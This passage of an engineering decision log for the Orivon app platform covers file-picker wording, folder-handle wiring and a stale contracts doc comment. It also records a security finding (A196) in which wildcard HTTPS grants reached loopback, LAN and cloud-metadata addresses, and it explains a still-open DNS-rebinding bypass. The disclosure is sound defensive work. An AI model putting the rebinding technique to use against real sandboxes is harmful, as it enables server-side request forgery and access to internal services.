- OS picker dialog, multiple files: `title` `Choose files for "${appName}" to access`;
  `buttonLabel` `Allow access to these files`; `message` (macOS only) `This app will be able to
  read and change these files, including emptying them.`
- Settings permissions row, file: `Can read and change "${path}", including emptying it.`,
  `warning: false` (unchanged from A187).

Both dialog and settings-row wording moved out of `src/broker/transport/ipc.ts`'s
`pickPath`/`src/main/permissions.ts`'s `describePickedPath` into a pure, independently-testable
form (`ipc.ts`'s new exported `describePickerDialog`) -- `dialog` is a real Electron value
import and cannot be exercised from this suite (`ipc.ts`'s own "TESTABLE WITHOUT ELECTRON"
header), so the wording itself needed a seam that could be. Both `describePickedPath`'s and
`describePickerDialog`'s doc comments now cite `d-0032` and no longer carry a "PROPOSED, NOT
OWNER-REVIEWED" marker.

**2. The page surface -- built for the FILE shape, deliberately STOPPED for the FOLDER shape.**
The brief's own instruction: wire the dispatch case plus the preload closure now that the
wording gate cleared, but stop and report rather than invent a delivery mechanism if the shape
turns out not to fit the existing transport.

**What was built, FILE shape only:** `fs.userSelected` joined `ControlMethod`
(`ipc-validation.ts`), with a new `isFsUserSelectedParams` validator and a
`dispatch-fs.ts` case satisfying the `never`-typed exhaustiveness guard PR #213 added (both the
per-file `dispatchFs` switch and `ipc.ts`'s own top-level routing switch needed the new case --
found by the compiler, not by reading, exactly what that guard is for). A picked file's
`FailableFileHandle` registers in the EXACT SAME `FsTransport.registry` `fs.open` already uses
(`registerFileHandle`, extracted so both callers share one registration mechanism rather than
two copies of it, Rule 3) -- so a picked file's id is usable through the SAME
`fs.read`/`write`/`fstat`/`truncate`/`sync`/`close` cases `fs.open` already wired, with zero new
handle-scoped dispatch code. `src/preload/orivon-surface.ts` gained `fsUserSelected`, wired into
both `exposeFallback` and the `executeInMainWorld` bridge; `src/preload/main-world-socket.ts`
gained the matching bridge field and reuses `buildFile` per returned handle (Rule 3 again -- no
second wrapping implementation). The preload's own exposed type omits `directory` entirely
rather than accept it and fail at runtime.

**What was deliberately NOT built, FOLDER shape:** `dispatch-fs.ts`'s `'fs.userSelected'` case
refuses `directory: true` with `'internal'` before the broker is ever called, citing this entry.
**Why this is a shape problem, not plumbing, per the brief's own test:** `FileHandle`'s
handle-scoped siblings (`fs.read`/`write`/`fstat`/`truncate`/`sync`/`close`) already existed
before this lane touched anything -- A184 built them for `fs.open`, and the file shape above
reuses every one of them for free. `DirectoryHandle` (`src/contracts/handles.ts`) has NO such
precedent: its own method set -- `readdir`/`stat`/`mkdir`/`rm`/`rename`/`readFile`/`writeFile`/
`open` -- is eight RPC-shaped calls with no existing handle-scoped dispatch case to reuse for
any of them. Delivering it would mean inventing a parallel dispatch surface (eight new cases,
eight new payload validators, a registry decision for `FailableDirectoryHandle`, eight new
preload closures) on top of a method set **A167 already flags as an unconfirmed AI
recommendation** ("`DirectoryHandle`'s method set mirrors `OrivonFs` rather than the web
platform's `FileSystemDirectoryHandle`... confirm before the broker lane... takes this shape as
given" -- never confirmed). Building that surface now would bake an unreviewed shape into the
wire protocol; STOPPING and filing it, per the brief's own instruction, is the correct call here,
not a shortfall.

**Verified, this lane:** `npm run typecheck` clean; `npm test` 4610 passed, 3 skipped (202 test
files) -- baseline after this lane's own merge of `origin/main` (which also resolved a real
conflict in `src/broker/fs-capability.ts`, PR #213's `truncate` quota/lock fix carried forward
into `fs-handle-wrapper.ts` rather than dropped): 4584 passed, 3 skipped, 200 files; this lane
added 26 net new passing tests (`picker-dialog-wording.test.ts`, `ipc-fs-user-selected.test.ts`,
plus additions to `permissions.test.ts`, `orivon-surface.test.ts`,
`main-world-socket-fs.test.ts`). `npm run check:size`/`check:comments`/`check:contracts`/
`check:natives`/`check:secrets`/`check:questions`/`check:manifest-parity` all pass.
`npm run test:e2e` was deliberately **not run** -- this lane does not launch Electron.

**Ready for one, once dispatched:** a real Electron launch, a real temp file picked via a real
`dialog.showOpenDialog` call (proving the owner-approved title/buttonLabel/message actually
render, which no unit test can — `dialog` is a real Electron value import), a real page calling
`window.orivon.fs.userSelected()` and reading/writing the picked file through the SAME
`fs.read`/`fs.write` control methods `fs.open` already proved end to end, and a revoke from the
settings window tearing down that live handle — the same shape #82's Phase-1 e2e proved for
`net.connect`'s write pump, and what A187's own "ready for one" already named before the wording
gate cleared it.

**Needed by:** whichever lane gets A167 item 2's `DirectoryHandle` method set owner-confirmed,
which is the actual precondition for building its delivery mechanism -- not a wiring task on its
own, a design one.
> **Resolved 2026-09-16, `d-0031`, lane `stream/broker-18-narrow-lookup-union` (A193). Option
> (a).** `https.connect` is dropped from `net-capability.ts`'s `OUTBOUND_CAPABILITIES`, which now
> reads `['tcp.connect', 'udp.send']`. An app holding only `https.connect` loses the DNS-lookup
> convenience this entry describes; it must hold `tcp.connect` or `udp.send` to resolve a
> hostname through `orivon.net.lookup` at all. `tcp.connect` and `udp.send` are both kept, per
> this entry's own finding above (`authorisedSend` reuses `checkConnect` verbatim, so `udp.send`
> shares `tcp.connect`'s pre-existing force-a-resolution route exactly) -- narrowing the union
> was never a case for narrowing it to one capability.
>
> **Second half of the decision: narrow AND warn.** An app refused a lookup because it holds
> only `https.connect` gets a bare, uniform `'denied'` at the capability layer, same as any other
> reason `checkLookup` (`src/broker/policy/lookup.ts`) declines -- `errors.ts`'s "denied never
> varies by reason" rule is not relaxed for this case, and no new `OrivonErrorCode` was added.
> The NAMED refusal this decision also asked for happens one layer up, in
> `src/shim/node-dns.ts`'s `describeLookupDenial`: on a `'denied'` `net.lookup` rejection, it
> reads the app's own `orivon.app.grants()` -- a standing, already-legitimate capability an app
> has to introspect ITSELF, not the broker's reply saying anything new -- and, only when the held
> set is exactly "https.connect, no tcp.connect, no udp.send", rewrites the Node-shaped error's
> message to name the reason and the fix ("hold tcp.connect or udp.send to resolve a hostname").
> Any other denial (no grant at all, a held grant whose pattern does not match, `app.grants()`
> itself failing) falls back to the ordinary generic message rather than guessing. This is not a
> new channel: `app.grants()` already existed for exactly this kind of self-inspection
> (`capability-api.ts`'s own `OrivonApp.grants` doc), so nothing crosses the broker/shim trust
> boundary here that did not already.
>
> **The test that would have failed against the old behaviour:**
> `src/broker/tests/net-lookup.test.ts`'s `'denies a lookup under an https.connect-only grant --
> https.connect is not a raw-connection capability (d-0031)'` -- before this lane, the sibling
> test this replaced (`'resolves under an https.connect-only grant -- the union, not just
> tcp.connect'`) asserted the opposite outcome for the identical setup.
>
> **One residual finding, filed rather than fixed here: `src/contracts/capability-api.ts`'s own
> `OrivonNet.lookup` doc comment still states the pre-narrowing union** ("this rides whatever
> `tcp.connect`, `https.connect` and `udp.send` patterns... the app already holds"), now stale.
> This lane's own scope rule (`CLAUDE.md`'s parallel-work discipline: contracts changes are their
> own PR, merging first, never alongside an implementation) forbids touching
> `src/contracts/` here even for a doc-only correction -- see A193 below.

---

**Closed 2026-09-16 by PR #218.** The folder shape reaches a page: nine `DirectoryHandle` members
over eight `fs.dir*` control-channel methods, with `fs.dirOpen` routing through **the same
`registerFileHandle` mechanism `fs.open` already built** rather than a second file-handle path --
asserted by its own test, not left to convention.

**The scope call this entry recorded was right at the time and stopped being right when its reason
expired.** The folder shape was left unwired because the picker's wording was an open owner
checkpoint, and wiring it would have let a picker with unreviewed copy reach a real app. `d-0032`
closed that checkpoint; the wiring followed immediately. Worth keeping as a worked example: the
lane did not treat "not built" as a permanent verdict, and it did not build ahead of the gate
either.

**What does NOT close with it:** `DirectoryHandle`'s own method set is still an unconfirmed AI
recommendation (A167 item 2) -- continued as **A195**. The delivery mechanism is built against a
shape the owner has not ratified, and if that shape changes the wiring changes with it.

### A193 -- `capability-api.ts`'s `OrivonNet.lookup` doc comment still names `https.connect` as part of `net.lookup`'s authorising union, now stale under d-0031 **[NEEDS A CONTRACTS-ONLY FOLLOW-UP]**

**Raised 2026-09-16**, lane `stream/broker-18-narrow-lookup-union`, while implementing A190's
resolution (d-0031: `net.lookup` no longer reads a bound from `https.connect`, only from
`tcp.connect`/`udp.send` -- see A190's own resolved note for the full account).

`src/contracts/capability-api.ts`'s `OrivonNet.lookup` doc comment reads, unchanged by this lane:
"this rides whatever `tcp.connect`, `https.connect` and `udp.send` patterns (manifest.js) the
app already holds." That sentence is no longer true of the implementation this lane shipped
(`src/broker/net-capability.ts`'s `OUTBOUND_CAPABILITIES`, now `['tcp.connect', 'udp.send']`) or
of `src/broker/policy/README.md`'s design note, which this lane did update.

**Why left stale rather than fixed here.** This lane's own scope, set by the dispatch that
opened it, is explicit: "Do NOT touch `src/contracts/`. The capability signature does not
change." That instruction reflects a real, standing project rule (`CLAUDE.md`'s parallel-work
discipline): "Never modify `src/contracts/` in the same PR as an implementation. A contracts
change touches every stream at once; it goes in its own PR and merges first." A doc-comment-only
correction is still a `src/contracts/` change under that rule, however small, so it was not made
here even though the fix itself is a two-line prose edit with no signature change at all.

**Not a security or correctness gap** -- the doc comment is documentation, not code; nothing
reads it at runtime, and the actual authorising set is correctly narrowed. It is a fidelity gap:
a reader of `capability-api.ts` (which `docs/README.md` calls out as "the product surface in
seven files, faster than any prose") would currently learn the wrong bound for `net.lookup`.

**AI recommendation:** a follow-up contracts-only PR should update `OrivonNet.lookup`'s doc
comment to read "`tcp.connect` and `udp.send`" in place of "`tcp.connect`, `https.connect` and
`udp.send`", and should note the `https.connect` exclusion and why (mirroring
`src/broker/policy/README.md`'s own updated note under this lane's PR), matching the doc
carve-out `code-guidelines.md` Rule 1 already grants exported declarations in `src/contracts/`.
Small enough to fold into whatever contracts PR is next in the queue rather than needing its own,
at the owner's discretion.

**Needed by:** whoever next opens a `src/contracts/`-touching PR, or a dedicated docs-only one if
none is queued soon enough that this drifts further from the implementation it describes.

### A195 -- the FOLDER shape of `orivon.fs.userSelected` now reaches a page, built against A167 item 2's method set while it is STILL an unconfirmed AI recommendation **[NEEDS OWNER DECISION on A167 item 2 -- everything else below is AI-REC or verified fact]**

**Raised 2026-09-16**, lane `stream/broker-19-directory-handle-page` (A194-folder), closing A194's
own "deliberately not built" gap: `DirectoryHandle`'s nine members (`contracts/handles.ts`) now
have a full CONTROL_CHANNEL path, dispatched from `dispatch-fs.ts` and exposed through both preload
worlds (`orivon-surface.ts`'s `exposeFallback`, `main-world-socket.ts`'s `installOrivon`).

**1. The gate A194 named was not cleared -- it was overridden by explicit instruction, and that
distinction matters.** A194's own text is direct: building this surface needs `DirectoryHandle`'s
method set (A167 item 2: readdir/stat/mkdir/rm/rename/readFile/writeFile/open, minus
`readFileSync`/`userSelected`) "owner-confirmed" first, because it is "AI judgment, not owner-
reviewed" (A167's own words). That confirmation never happened between A194 and this lane. This
lane's own brief stated the broker capability was "fully built and tested" and instructed
building the page path regardless, on the reasoning that `fs.open`'s `FileHandle` precedent proves
the shape fits. That reasoning is sound engineering (see §2), but it is not the same thing as the
owner confirming A167 item 2, and CLAUDE.md Rule 2 says not to blur the two. **Still open:** A167
item 2's method-set shape itself remains an unconfirmed AI recommendation; what this lane confirms
is only that IF that shape is right, it has a working, tested delivery mechanism now built on top
of it. If the owner later changes `DirectoryHandle`'s method set, this lane's dispatch/preload
layer changes with it (mechanical, not a redesign) -- the wire methods below are a thin RPC skin
over whatever the contract says.

**2. The shape DID fit, exactly as `fs.open` predicted -- verified, not assumed.** Eight new
CONTROL_CHANNEL methods (`fs.dirReaddir`/`dirStat`/`dirMkdir`/`dirRm`/`dirRename`/`dirReadFile`/
`dirWriteFile`/`dirOpen`), one per `DirectoryHandle` member, each carrying the folder handle's `id`
the same way `fs.read`/`fs.write`/... already carry a file's. `fs.dirOpen` is the load-bearing
case: `DirectoryHandle.open()` resolves a real `FileHandle` (`../user-selected-capability.ts`'s
own `toFailableDirectoryHandle.open`, unchanged by this lane), registered through the EXACT SAME
`registerFileHandle` `fs.open`/`fs.userSelected`'s file shape already use -- so every subsequent
call against a folder-opened file (`fs.read`/`write`/`fstat`/`truncate`/`sync`/`close`) needed ZERO
new dispatch code. No second file-handle mechanism was built, matching this lane's own brief.

**3. Four AI-judgment calls made while wiring this, none owner-reviewed:**

- **Wire method naming** (`fs.dirReaddir` etc., one dot, not `fs.dir.readdir`): matches every other
  `ControlMethod` member's flat `category.verb` convention (`net.setKeepAlive`, not
  `net.set.keepAlive`); a two-dot form would have been the only one in the file.
- **`FailableDirectoryHandle.open`'s return type widened from the inherited `Promise<FileHandle>`
  to `Promise<FailableFileHandle>`** (`src/broker/handles/handle-contracts.ts`) -- precedented by
  `FailableTcpServer.connections: ReadableStream<FailableTcpSocket>` (that file's own doc: a
  nested handle a `Failable*` type PRODUCES needs the same broker-internal escape hatch its parent
  has). Tightens a type to match what `user-selected-capability.ts` already returned at runtime;
  no behaviour change, confirmed by `npm run typecheck` before and after.
- **`fs.close` closes either kind** (checks `FsTransport.registry` then `dirRegistry`) rather than
  adding a `fs.dirClose` method -- a page never knows which kind an id names, and ids are drawn
  from one global unguessable pool (`fs-handle-wrapper.ts`'s own doc), so one method is unambiguous
  and correct for both.
- **`FsTransport.dirRegistry` is OPTIONAL**, not a required second field alongside `registry` --
  minimises the blast radius on the ~15 existing test files that construct an `FsTransport` for
  scenarios that never touch the folder shape (all keep compiling unchanged); production wiring
  (`ipc.ts`'s `brokerIpcSubsystem`) always supplies both, and a directory case reached without one
  fails `'internal'`, covered by its own test.

**4. `src/shim-electron/dialog.ts` needed NO change.** Its refusal already named the real remaining
gap (A187: `userSelected` resolves an opaque handle, never `showOpenDialog`'s raw host path) rather
than claiming the broker did not implement `userSelected` -- that correction predates this lane
(A194's own "L5-userselected" landing). This lane changes which shapes reach a page, not whether
`userSelected` itself is implemented, so `dialog.ts`'s own reasoning is unaffected either way.

**Verified, this lane (2026-09-16, `5d144f9` base):** `npm run typecheck` clean. `npm test`: **4651
passed, 3 skipped** (baseline before this lane: 4615 passed, 3 skipped -- one stale test removed
from `ipc-fs-user-selected.test.ts`, two stale tests replaced in `orivon-surface.test.ts`, 39 net
new added across `ipc-fs-user-selected-directory.test.ts` (31), `main-world-socket-fs.test.ts` (7),
`orivon-surface.test.ts` (2)). `check:size`/`check:comments`/`check:contracts`/`check:questions`/
`check:manifest-parity`/`check:natives`/`check:secrets` all pass. `src/broker/transport/tests/
ipc.test-helpers.ts` was measured at 499/500 before this lane touched it; split into a new
`stub-broker.ts` (pure move, own commit, `git log` shows it landed before any behavioural change)
before adding the folder-shape's own widened `stubBroker.userSelected` override.

**Not run:** `npm run test:e2e` / a real Electron launch, per this lane's own instructions.
**Ready for one:** a real folder picked via a real `dialog.showOpenDialog` call, a real page
calling `orivon.fs.userSelected({ directory: true })`, reading/writing/opening a file inside it
through the SAME `fs.dir*`/`fs.read`/`fs.write` control methods this lane proved at the unit level,
and a revoke from the settings permissions list tearing down both the folder handle and a
`FileHandle` opened through it live -- the same shape #82's Phase-1 e2e proved for `net.connect`'s
write pump, and what A194's own "ready for one" already named before this lane cleared it.

**Needed by:** the owner, to confirm or revise A167 item 2's `DirectoryHandle` method set now that
a real page can exercise it -- and whoever builds the settings-permissions UI surface for a picked
folder, which this lane's dispatch layer is ready for but does not itself build.

### A196 -- a wildcard `https.connect` grant reached loopback, the LAN and the cloud metadata address; `hostMatchesSecure`'s own doc argued the TLS certificate check stood in for an address-class gate it does not have **[RESOLVED 2026-09-17 -- owner decision (via conductor authorisation), lane FIX-A1, `stream/broker-52-secure-private-address-gate`]**

Found by a `/claude-security` scan pass, the most serious live finding it surfaced. Measured, not
theorised -- the conductor ran both `net.connect` gates against the same wildcard grant on `main`
before this lane was dispatched:

```
https *:443  -> 127.0.0.1        ALLOWED
https *:443  -> 192.168.1.1      ALLOWED
https *:443  -> 10.0.0.5         ALLOWED
https *:443  -> 169.254.169.254  ALLOWED     <- cloud metadata endpoint
tcp   *:*    -> 127.0.0.1        denied (no-pattern-match)
tcp   *:*    -> 192.168.1.1      denied
tcp   *:*    -> 10.0.0.5         denied
tcp   *:*    -> 169.254.169.254  denied
```

**Root cause.** `hostMatchesSecure` (`src/broker/policy/connect-secure.ts`) returned `true`
unconditionally whenever a granted pattern's host was `'*'`, whatever the requested address. Its
own doc comment argued this was deliberate: `'*'` authorises any host "because there is no address
class left to narrow it against ... the certificate check is what stands in for that here." **That
argument is wrong, and the reason is specific: a certificate binds a NAME, not an ADDRESS.** An
attacker's own domain, carrying a perfectly valid, publicly-trusted certificate, can have its A
record point at `127.0.0.1` or `192.168.1.1` -- TLS validates the name and succeeds regardless of
where the socket actually connects. The certificate check and an address-class gate answer two
different questions and passing one says nothing about the other.

**It also contradicted this file's own recorded intent.** A192 (above) states that a `*` grant
"explicitly does not" reach loopback and the LAN, citing A82 as the source of that rule, and
`connect-src.ts`'s CSP derivation already omits a `*` host from `connect-src` for exactly that
reason. `checkConnectSecure` disagreed with its own neighbouring files, and a stale rationale
comment is what let this pass an earlier automated security review uncaught.

**The decision, already taken.** The conductor's ruling, with the owner's explicit authorisation:
resolve toward A192/A82's intent rather than re-litigate it. A `*` host in an `https.connect` grant
must not authorise a request whose target is not public unicast -- matching `checkConnect`'s own
behaviour for plain `tcp.connect`. **An explicitly-named literal is unaffected**: a pattern like
`192.168.1.10:443` still authorises exactly that literal, unchanged -- the file's existing rule
that a named literal is a deliberate, different case from `*` survives; only the wildcard narrows.

**What changed.** `hostMatchesSecure`'s `'*'` branch now requires the requested literal to be
public unicast, via `isPublicUnicast` (`./address.ts`) -- the SAME helper `checkConnect`/
`connect-patterns.ts`'s own `hostMatches` already uses for its `'any-public-unicast'` case; no
second address classifier was written (Rule 3). A new denial reason, `'non-public-address'`, was
added to `ConnectSecureDenialReason` so the broker's local log (never sent to an app) can tell "your
grant does not cover this address class" from a plain "nothing named this host" `'no-pattern-match'`.
The doc comment on `hostMatchesSecure` was rewritten in place to state the new rule and retire the
old argument explicitly, rather than deleting it silently -- so a future reader sees what was wrong
and why, not just a diff.

**What this fix does NOT catch -- stated plainly, not papered over. Still open, genuinely, not
decided here.** `checkConnectSecure` is synchronous and has no resolver, unchanged by this fix
(its own module header says so, and that absence is load-bearing to why the file is shaped the way
it is). The new gate only ever sees the address the app directly asked to connect to -- it classifies
the REQUESTED HOST when that host is itself an address literal (an app calling `https.connect`
straight against `127.0.0.1`, say). **A hostname that RESOLVES to a private address is not caught by
this change**, because there is no resolution step in this file for it to be caught at. The
mechanism is DNS rebinding: an app declares and is granted `https.connect: ["*:*"]`, names
`evil.example.com` (a domain it controls, with a validly-issued certificate for that name), whose A
record briefly answers with `127.0.0.1` or `169.254.169.254`, and this synchronous, name-matching
check has nothing to compare that name's eventual destination against -- the certificate still binds
the NAME cryptographically, but nothing here binds the ADDRESS the way `checkConnect`'s
resolve-then-classify order does for plain TCP. Closing this residual would need either (a) a
resolver wired into this path the way `checkConnect` has one -- a materially bigger change to a
file whose entire reason for existing is being resolver-free, or (b) a connect-time check inside the
TLS adapter itself (`../adapters/tls-adapter.ts`) against the socket's actual peer address, alongside
or before the handshake. Neither is built here. **The owner's call, not this lane's**, on whether
that residual needs closing before this ships further, and if so which of the two shapes above (or
another) is preferred.

**Verified.** Test-first: `src/broker/policy/tests/connect-secure.test.ts` gained a new `A196`
describe block asserting denial for `127.0.0.1`/`192.168.1.1`/`10.0.0.5`/`169.254.169.254`/`::1`
under a `*:443` grant, an explicit public-address and explicit-literal control, and a parity
assertion against `checkConnect` for the same address set under the same wildcard grant -- run
against unmodified `main` code first and confirmed FAILING (10 of 45 tests in the file: all five
denial cases plus all five parity cases; the four unaffected controls already passed). After the
fix: all 45 tests in the file pass, the full suite is unaffected (204 files, 4709 passed, 3 skipped),
and `npm run typecheck` is clean.

**Scope: `https.connect` only**, matching the file this defect lives in. `tcp.connect`/`udp.send`
were already correct (the conductor's own measurement above) and untouched by this lane.
